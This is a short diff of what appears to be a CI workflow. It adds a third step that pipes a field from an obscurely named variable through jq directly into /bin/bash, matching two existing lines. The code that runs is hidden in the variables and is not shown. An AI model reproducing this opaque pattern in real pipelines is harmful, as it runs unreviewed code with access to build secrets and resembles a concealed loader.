@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$c65" | jq -r .mt59 | /bin/bash
           printf '%s' "$mvnb61" | jq -r .v541 | /bin/bash
+          printf '%s' "$j50080" | jq -r .pe7342 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
